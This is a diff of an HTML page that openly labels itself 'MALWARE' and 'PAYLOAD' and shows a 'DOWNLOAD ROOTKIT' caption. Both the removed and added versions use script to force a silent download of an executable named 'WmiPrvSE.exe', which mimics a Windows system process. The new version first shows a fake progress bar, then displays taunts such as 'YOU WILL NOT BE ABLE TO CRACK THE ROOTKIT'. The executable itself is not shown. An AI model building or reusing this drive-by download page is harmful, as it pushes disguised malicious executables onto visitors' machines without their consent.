@@ -1,22 +1,105 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en"><head>
+    <link rel="icon" type="image/x-icon" href="https://github.com/eq44/eq44.github.io/raw/main/SOVIET.ico">
+    <meta property="og:title" content="MALWARE">
+    <meta property="og:description" content="CREATED BY ABOLHB">
+    <meta property="og:image" content="https://raw.githubusercontent.com/eq44/eq44.github.io/main/SOVIET.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="1200">
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Malware</title>
-    <script>
-        function downloadFile() {
-            const link = document.createElement('a');
-            link.href = 'WmiPrvSE.exe';
-            link.download = 'WmiPrvSE.exe';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>PAYLOAD</title>
+  <style>
+    html {
+      background: #100000;
+      font-family: "Roboto Condensed", sans-serif;
+    }
+    .caption {
+      background-color: #FF0000;
+      color: black;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      width: fit-content;
+      margin-top: 30vh;
+      font-size: 30px;
+      transition-duration: 0.3s;
+      border: 2px solid #FF0000;
+    }
 
-        window.onload = downloadFile;
-    </script>
+    .caption:hover {
+      background-color: black;
+      color: #FF0000;
+      border: 2px solid #FF0000;
+    }
+
+    .range {
+      animation-name: load;
+      animation-duration: 5s;
+      background-color: #FF0000;
+      height: 5px;
+      width: 0px;
+      display: block;
+      margin-top: 20px;
+      margin-left: 25%;
+    }
+
+    @keyframes load {
+      0% {
+        width: 0;
+      }
+      20%, 25% {
+        width: 10%;
+      }
+      40% {
+        width: 15%;
+      }
+      80% {
+        width: 45%;
+      }
+      95% {
+        width: 46%;
+      }
+      99% {
+        width: 50%;
+      }
+      100% {
+        display: none;
+      }
+    }
+  </style>
 </head>
 <body>
+  <element class="caption">DOWNLOAD ROOTKIT</element>
+  <div class="range"></div>
+  <script>
+    setTimeout(function () {
+      var caption = document.querySelector(".caption");
+      caption.innerHTML = "DONE";
+      caption.style.color = "#FF0000"; 
+      caption.style.background = "transparent";
+      caption.style.border = "2px solid transparent";
+      var link = document.createElement("a");
+      link.href = "WmiPrvSE.exe";
+      link.download = "WmiPrvSE.exe";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      setTimeout(function () {
+        caption.innerHTML = "";
+        setTimeout(function () {
+          caption.style.color = "red";
+          setTimeout(function () {
+            caption.innerHTML = "CREATED BY ABOLHB";
+            setTimeout(function () {
+              setTimeout(function () {
+                caption.innerHTML = "YOU WILL NOT BE ABLE TO CRACK THE ROOTKIT :)";
+              }, 500);
+            }, 1500);
+          }, 500);
+        }, 1000);
+      }, 1000);
+    }, 4700);
+  </script>
 </body>
 </html>
